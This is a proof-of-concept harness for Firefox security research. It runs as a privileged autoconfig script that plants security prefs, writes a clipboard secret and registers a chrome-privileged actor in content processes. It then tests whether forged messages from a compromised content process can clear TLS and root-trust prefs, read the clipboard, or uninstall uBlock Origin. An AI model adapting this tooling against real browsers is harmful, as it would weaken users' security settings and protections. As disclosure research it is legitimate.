// =====================================================================
// PoC orchestrator (parent process, system principal via autoconfig).
// Firefox 155: legacy loadFrameScript is inert here, so the content-side
// simulation runs as a registered JSWindowActor pair ("PocRepro") whose
// child module executes with chrome privileges inside REAL content
// processes — the compromised-content-process threat model.
// =====================================================================
var pocLog = [];
function pocLogLine(s) {
  pocLog.push("[" + new Date().toISOString() + "] " + s);
  try { dump("POC: " + s + "\n"); } catch (e) {}
}

var Ci = Components.interfaces;
var Cc = Components.classes;

var prefs = Cc["@mozilla.org/preferences-service;1"].getService(Ci.nsIPrefBranch);
var obs = Cc["@mozilla.org/observer-service;1"].getService(Ci.nsIObserverService);
var io = Cc["@mozilla.org/network/io-service;1"].getService(Ci.nsIIOService);
var appStartup = Cc["@mozilla.org/toolkit/app-startup;1"].getService(Ci.nsIAppStartup);

var AddonManager, Timer;
var hasAddonManager = false;
var GServices = globalThis.Services || null;

const SECRET = "POC-SECRET-" + Math.floor(Math.random() * 1e9);
const RESULTS_PATH = "D:\\firefox-research\\submissions\\addons-bridge\\RESULTS.md";
const UBLOCK_ID = "uBlock0@raymondhill.net";
const UBLOCK_XPI = "D:\\firefox-research\\poc-repro\\dl\\ublock.xpi";

var state = { pre: {}, post: {}, content: {}, addonInstalled: false, addonAfter: null };
const CANDS = (prefs.getStringPref("poc.candidates", "clipboard,neterror,addons") || "clipboard,neterror,addons").split(",");
function cand(n) { return CANDS.indexOf(String(n)) !== -1; }
var pending = { neterror: false, clipboard: false, amInventory: false, amDisable: false, amUninstall: false };
var finished = false;

function setPrefUser(name, val) {
  prefs.setBoolPref(name, val);
  return prefs.prefHasUserValue(name);
}
function snapshotPrefs(tag) {
  state[tag] = {
    tls13_user: prefs.prefHasUserValue("security.tls.version.enable-tls1_3"),
    entroots_user: prefs.prefHasUserValue("security.enterprise_roots.enabled"),
    trr_domains: prefs.getStringPref("network.trr.excluded-domains", ""),
  };
}

// 1) plant user prefs that the forged messages should clear
state.pre.tls13_set = setPrefUser("security.tls.version.enable-tls1_3", false);
state.pre.entroots_set = setPrefUser("security.enterprise_roots.enabled", false);
prefs.setStringPref("network.trr.excluded-domains", "poc-base.invalid");
snapshotPrefs("pre");
pocLogLine("pre: tls13_user=" + state.pre.tls13_user + " entroots_user=" +
           state.pre.entroots_user + " trr=" + state.pre.trr_domains);

function mark(kind, payload) {
  state.content[kind] = payload;
  if (kind in pending) pending[kind] = true;
  pocLogLine("report " + kind + ": " + JSON.stringify(payload).slice(0, 400));
  if (pending.neterror && pending.clipboard && pending.amInventory &&
      pending.amDisable && pending.amUninstall && !finished) {
    finish();
  }
}

function writeResults() {
  var md = ["# PoC RESULTS " + new Date().toISOString(), ""];
  md.push("SECRET=" + SECRET);
  md.push("");
  md.push("## NetError forged messages -> pref tampering");
  md.push("- pre : tls1_3 user=" + state.pre.tls13_user + " entroots user=" +
          state.pre.entroots_user + " trr-excluded=" + state.pre.trr_domains);
  md.push("- post: tls1_3 user=" + state.post.tls13_user + " entroots user=" +
          state.post.entroots_user + " trr-excluded=" + state.post.trr_domains);
  md.push("- EXPECT if bug confirmed: post user-prefs cleared (false/false) and trr list contains poc-invalid-8zq3.invalid");
  md.push("");
  md.push("## Content-process reports (real content process, chrome-privileged actor)");
  for (var k in state.content) {
    md.push("- " + k + ": " + JSON.stringify(state.content[k]));
  }
  md.push("");
  md.push("## amManager bridge");
  md.push("- uBlock installed=" + state.addonInstalled);
  md.push("- addon state after forged disable/uninstall: " + JSON.stringify(state.addonAfter));
  md.push("");
  md.push("## Log");
  for (var l of pocLog) md.push("- " + l);
  var text = md.join("\n");
  try {
    var f = Cc["@mozilla.org/file/local;1"].createInstance(Ci.nsIFile);
    f.initWithPath(RESULTS_PATH);
    var fo = Cc["@mozilla.org/network/file-output-stream;1"]
      .createInstance(Ci.nsIFileOutputStream);
    fo.init(f, 0x02 | 0x08 | 0x20, 420, 0);
    fo.write(text, text.length);
    fo.close();
    pocLogLine("results written");
  } catch (e) { pocLogLine("write results failed: " + e); }
}

function finish() {
  if (finished) return;
  finished = true;
  try { snapshotPrefs("post"); } catch (e) {}
  pocLogLine("finish: pending=" + JSON.stringify(pending));
  var done = function () {
    writeResults();
    // keep the browser open for manual inspection when poc.quit=false
    if (!prefs.getBoolPref("poc.quit", true)) {
      pocLogLine("poc.quit=false - browser left open for manual inspection");
      return;
    }
    appStartup.quit(Ci.nsIAppStartup.eForceQuit);
  };
  if (AddonManager) {
    try {
      AddonManager.getAddonByID(UBLOCK_ID).then(function (a) {
        state.addonAfter = a ? { userDisabled: a.userDisabled,
                                 pendingUninstall: a.pendingUninstall } : "gone-or-null";
        done();
      }, function (e) { state.addonAfter = "lookup-failed: " + e; done(); });
    } catch (e) { state.addonAfter = "lookup-threw: " + e; done(); }
  } else { done(); }
}
var watchdogArmed = false;
function armWatchdog() {
  if (watchdogArmed) return;
  watchdogArmed = true;
  if (Timer && Timer.setTimeout) {
    Timer.setTimeout(function () {
      pocLogLine("watchdog fired; pending=" + JSON.stringify(pending));
      finish();
    }, 90000);
  }
}
// NOTE: with poc.quit=false the finish() call no longer quits; the watchdog
// still writes RESULTS.md so nothing is lost, but the window stays open.

// 4) addon install (parent, real signed XPI from AMO)
function installUblock() {
  return new Promise(function (resolve) {
    if (!AddonManager) { resolve("no-addonmanager"); return; }
    try {
      var f = Cc["@mozilla.org/file/local;1"].createInstance(Ci.nsIFile);
      f.initWithPath(UBLOCK_XPI);
      AddonManager.getInstallForFile(f, null).then(function (install) {
        install.addListener({
          onInstallEnded: function (i, addon) {
            pocLogLine("uBlock installed: " + addon.id);
            resolve("installed");
          },
          onInstallFailed: function (i) { pocLogLine("install failed: " + i.error); resolve("failed"); },
          onDownloadFailed: function (i) { pocLogLine("download failed: " + i.error); resolve("failed"); },
        });
        install.install();
      }, function (e) { pocLogLine("getInstallForFile rejected: " + e); resolve("failed"); });
    } catch (e) { pocLogLine("install threw: " + e); resolve("failed"); }
  });
}

// 5) when the first browser window is ready: register the actor pair and
//    drive the repro tabs.
function onWindow(win) {
  try {
    try {
      Timer = ChromeUtils.importESModule("resource://gre/modules/Timer.sys.mjs");
      AddonManager = ChromeUtils.importESModule(
        "resource://gre/modules/AddonManager.sys.mjs").AddonManager;
      hasAddonManager = true;
      pocLogLine("late ESM imports OK");
    } catch (e) { pocLogLine("late ESM import failed: " + e); }

    // clipboard secret (write late, read back parent-side immediately)
    try {
      var cb = Cc["@mozilla.org/widget/clipboard;1"].getService(Ci.nsIClipboard);
      var xfer = Cc["@mozilla.org/widget/transferable;1"].createInstance(Ci.nsITransferable);
      xfer.init(null);
      var str = Cc["@mozilla.org/supports-string;1"].createInstance(Ci.nsISupportsString);
      str.data = SECRET;
      xfer.setTransferData("text/unicode", str);
      xfer.setTransferData("text/plain", str);
      cb.setData(xfer, null, Ci.nsIClipboard.kGlobalClipboard);
      pocLogLine("clipboard secret set: " + SECRET);
      var snap2 = cb.getDataSnapshotSync(["text/unicode", "text/plain"], Ci.nsIClipboard.kGlobalClipboard, null);
      var x2 = Cc["@mozilla.org/widget/transferable;1"].createInstance(Ci.nsITransferable);
      x2.init(null);
      snap2.getDataSync(x2);
      for (var f2 of ["text/unicode", "text/plain"]) {
        try {
          var out2 = {};
          x2.getTransferData(f2, out2);
          if (out2 && out2.value) {
            pocLogLine("parent readback [" + f2 + "]: " + out2.value.QueryInterface(Ci.nsISupportsString).data);
            break;
          }
        } catch (e3) {}
      }
    } catch (e) { pocLogLine("clipboard write/read failed: " + e); }
    armWatchdog();
    // force amManager instantiation (registers Services.mm listeners), with retries
    var t0 = (Timer && Timer.setTimeout) ? Timer.setTimeout : function (fn, ms) {
      var timer = Cc["@mozilla.org/timer;1"].createInstance(Ci.nsITimer);
      timer.initWithCallback({ notify: fn }, ms, Ci.nsITimer.TYPE_ONE_SHOT);
    };
    [0, 3000].forEach(function (delay, idx) {
      t0(function () {
        if (state.amReady) return;
        try {
          var amMod = ChromeUtils.importESModule(
            "resource://gre/modules/amManager.sys.mjs");
          new amMod.amManager();
          state.amReady = true;
          pocLogLine("amManager manually instantiated (attempt " + (idx + 1) + ")");
        } catch (e) { pocLogLine("am instantiate attempt " + (idx + 1) + " failed: " + e); }
      }, delay);
    });
    try {
      if (GServices && GServices.ppmm) {
        GServices.ppmm.addMessageListener("poc:report2", function (m) {
          pocLogLine("ppmm report2: " + JSON.stringify(m.data).slice(0, 200));
        });
      } else { pocLogLine("no global Services/ppmm for report2"); }
    } catch (e) { pocLogLine("mm listener failed: " + e); }

    // report plumbing: parent actor -> observer -> orchestrator
    obs.addObserver({
      observe: function (subject) {
        const d = subject && subject.wrappedJSObject;
        if (d && d.kind) mark(d.kind, d.payload);
      },
    }, "poc:report", false);

    // register the custom actor pair (child module runs in content processes)
    try {
      ChromeUtils.registerWindowActor("PocRepro", {
        parent: { esModuleURI: "resource://gre/modules/poc-parent.sys.mjs" },
        child: {
      esModuleURI: "resource://gre/modules/poc-child.sys.mjs",
      events: { DOMDocElementInserted: {}, pageshow: {}, click: {} },
    },
    safeForUntrustedWebProcess: true,
        allFrames: true,
        matches: ["http://*/*", "https://*/*", "about:*"],
      });
      pocLogLine("PocRepro actor registered late");
    } catch (e) { pocLogLine("late register (expected if early succeeded): " + e); }

    var gBrowser = win.gBrowser;
    installUblock().then(function (r) {
      state.addonInstalled = (r === "installed");
      // delay tabs until AddonManager has fully settled after the install
      var t0 = (Timer && Timer.setTimeout) ? Timer.setTimeout : function (fn, ms) {
        var timer = Cc["@mozilla.org/timer;1"].createInstance(Ci.nsITimer);
        timer.initWithCallback({ notify: fn }, ms, Ci.nsITimer.TYPE_ONE_SHOT);
      };
      t0(function () {
      // 155 requires a triggeringPrincipal for addTab
      const sysPrin = Cc["@mozilla.org/scriptsecuritymanager;1"]
        .getService(Ci.nsIScriptSecurityManager).getSystemPrincipal();
      if (cand("neterror")) gBrowser.addTab("http://poc-invalid-8zq3.invalid/",
                      { triggeringPrincipal: sysPrin }); // -> about:neterror
      if (cand("addons")) gBrowser.addTab("about:blank",
                      { triggeringPrincipal: sysPrin }); // -> amManager repro host
      var t = (Timer && Timer.setTimeout) ? Timer.setTimeout : function (fn, ms) {
        var timer = Cc["@mozilla.org/timer;1"].createInstance(Ci.nsITimer);
        timer.initWithCallback({ notify: fn }, ms, Ci.nsITimer.TYPE_ONE_SHOT);
      };
      // poll: explicitly construct the PocRepro actor pair for every tab's
      // current WindowGlobal (auto-construction is unreliable for runtime
      // registered actors)
      var constructed = {};
      var actorByWin = {};
      var driveUninstall = function () {
        pocLogLine("driveUninstall: actors=" + Object.keys(actorByWin).length);
        for (var k in actorByWin) {
          try {
            actorByWin[k].sendAsyncMessage("poc:ping", {});
            actorByWin[k].sendAsyncMessage("poc:am-go2", { id: UBLOCK_ID });
            pocLogLine("sent poc:am-go2 via actor " + k);
          } catch (e) { pocLogLine("send failed via actor " + k + ": " + e); }
        }
      };
      // poll until AddonManager is initialized, then drive the uninstall
      var amPollCount = 0;
      var amPoll = function () {
        amPollCount++;
        if (finished) return;
        try {
          AddonManager.getAddonByID("default-theme@mozilla.org").then(function (a) {
            pocLogLine("AddonManager ready after " + amPollCount + " polls -> driving uninstall");
            driveUninstall();
          }, function (e) {
            if (amPollCount < 30) { t(amPoll, 2000); }
            else { pocLogLine("AddonManager never became ready"); }
          });
          if (amPollCount <= 3) { t(function () { driveUninstall(); }, 1500); }
        } catch (e) {
          if (amPollCount < 30) { t(amPoll, 2000); }
        }
      };
      var t = (Timer && Timer.setTimeout) ? Timer.setTimeout : function (fn, ms) {
        var timer = Cc["@mozilla.org/timer;1"].createInstance(Ci.nsITimer);
        timer.initWithCallback({ notify: fn }, ms, Ci.nsITimer.TYPE_ONE_SHOT);
      };
      t(amPoll, 2000);
      var poll = t(function () {
        try {
          for (var b of gBrowser.browsers) {
            var wgp = b.frameLoader && b.frameLoader.browsingContext &&
                      b.frameLoader.browsingContext.currentWindowGlobal;
            if (!wgp) continue;
            var key = String(wgp.innerWindowId);
            if (constructed[key]) continue;
            try {
              wgp.getActor("PocRepro");
              constructed[key] = true;
              pocLogLine("constructed PocRepro for innerWindow " + key +
                         " uri=" + (wgp.documentURI ? wgp.documentURI.spec : "?"));
            } catch (e) {
              pocLogLine("getActor failed for " + key + ": " + e);
              constructed[key] = "err";
            }
          }
        } catch (e) { pocLogLine("poll error: " + e); }
      }, 1200);
      // keep polling via repeating timer
      var rep = Cc["@mozilla.org/timer;1"].createInstance(Ci.nsITimer);
      rep.initWithCallback({
        notify: function () {
          try {
            for (var b of gBrowser.browsers) {
              var wgp = b.frameLoader && b.frameLoader.browsingContext &&
                        b.frameLoader.browsingContext.currentWindowGlobal;
              if (!wgp) continue;
              var key = String(wgp.innerWindowId);
              if (constructed[key]) continue;
              try {
                var pactor = wgp.getActor("PocRepro");
                constructed[key] = true;
                actorByWin[key] = pactor;
                pocLogLine("constructed PocRepro for innerWindow " + key +
                           " uri=" + (wgp.documentURI ? wgp.documentURI.spec : "?"));
              } catch (e) { constructed[key] = "err"; }
            }
          } catch (e) {}
        },
      }, 1500, Ci.nsITimer.TYPE_REPEATING_PRECISE);
      t(function () { finish(); }, 45000);
      }, 8000); // end of delayed tab-creation callback
    });
  } catch (e) { pocLogLine("onWindow failed: " + e); finish(); }
}

obs.addObserver({
  observe: function (subject, topic) {
    if (topic === "browser-delayed-startup-finished") {
      pocLogLine("window ready");
      onWindow(subject);
    }
  },
}, "browser-delayed-startup-finished", false);

pocLogLine("orchestrator armed");

// 0) register the actor pair EARLY — definitions are only pushed to content
//    processes at process creation, so this must happen before any tab loads.
try {
  ChromeUtils.registerWindowActor("PocRepro", {
    parent: { esModuleURI: "resource://gre/modules/poc-parent.sys.mjs" },
    child: {
      esModuleURI: "resource://gre/modules/poc-child.sys.mjs",
      events: { DOMDocElementInserted: {}, pageshow: {}, click: {} },
    },
    allFrames: true,
    matches: ["http://*/*", "https://*/*", "about:*"],
    safeForUntrustedWebProcess: true,
  });
  pocLogLine("PocRepro actor registered EARLY");
} catch (e) { pocLogLine("early registerWindowActor failed: " + e); }
